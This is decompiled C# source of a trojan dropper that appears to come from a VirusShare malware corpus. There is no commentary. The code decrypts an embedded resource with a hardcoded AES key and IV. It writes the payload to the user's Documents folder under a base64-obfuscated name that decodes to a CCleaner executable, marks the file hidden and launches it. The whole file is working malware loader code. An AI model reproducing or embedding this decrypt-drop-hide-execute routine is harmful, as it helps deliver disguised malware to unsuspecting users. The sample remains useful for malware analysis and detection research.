// Decompiled with JetBrains decompiler
// Type: kdNuxSuyNXsG
// Assembly: newtr, Version=1.1.1.129, Culture=neutral, PublicKeyToken=null
// MVID: F3A47A9F-3DDB-4B7A-8541-2F77A19FD43F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Crypt.bhlv-33bb50501ed2f7157ee9e8f9f6f984ba345eb94c9414c9a6f667642a68c162c5.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

public class kdNuxSuyNXsG
{
  [STAThread]
  public static void Main()
  {
    try
    {
      byte[] data = kdNuxSuyNXsG.PTY((byte[]) new ResourceManager("PYK", Assembly.GetExecutingAssembly()).GetObject("KiR"));
      string str = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\";
      if (File.Exists(str + Encoding.UTF8.GetString(Convert.FromBase64String("Q0NsZWFuZXIuZXhl"))))
        File.Delete(str + Encoding.UTF8.GetString(Convert.FromBase64String("Q0NsZWFuZXIuZXhl")));
      MyProject.Computer.FileSystem.WriteAllBytes(str + Encoding.UTF8.GetString(Convert.FromBase64String("Q0NsZWFuZXIuZXhl")), data, false);
      File.SetAttributes(str + Encoding.UTF8.GetString(Convert.FromBase64String("Q0NsZWFuZXIuZXhl")), FileAttributes.Hidden);
      Process.Start(str + Encoding.UTF8.GetString(Convert.FromBase64String("Q0NsZWFuZXIuZXhl")));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Process.GetCurrentProcess().Kill();
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().Kill();
  }

  public static byte[] PTY(byte[] Dot)
  {
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
      rijndaelManaged.IV = new byte[16]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7
      };
      rijndaelManaged.Key = new byte[16]
      {
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1,
        (byte) 9,
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(Dot, 0, Dot.Length);
    }
  }
}
